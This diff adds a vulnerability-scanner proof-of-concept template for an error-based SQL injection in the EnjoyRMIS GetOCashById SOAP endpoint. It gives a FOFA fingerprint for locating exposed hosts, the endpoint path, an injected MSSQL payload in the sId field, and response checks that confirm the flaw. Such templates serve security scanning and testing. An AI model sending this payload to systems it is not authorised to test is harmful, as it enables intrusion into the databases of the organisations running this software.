@@ -1,0 +1,26 @@
+id: poc-yaml-enjoyrmis-getocashbyid-sqli
+info:
+  name: EnjoyRMIS GetOCashById SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: enjoyrmis
+  fofa: body="CheckSilverlightInstalled"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /EnjoyRMIS_WS/WS/POS/cwsoa.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/GetOCashById
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <GetOCashById xmlns=\"http://tempuri.org/\">\n      <sId>string'\
+    \ AND 1234 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')))) AND\
+    \ 'uXof'='uXof</sId>\n    </GetOCashById>\n  </soap:Body>\n</soap:Envelope>"
+  expression: "status_code == 500 && \ncontains(body,\"soap:Server\") &&\ncontains(body,\"\
+    在将\") &&\ncontains(body,t2) &&\ncontains(body,\"转换成数据类型\") &&\ncontains(content_type,\"\
+    text/xml\")\n"
+transport: http
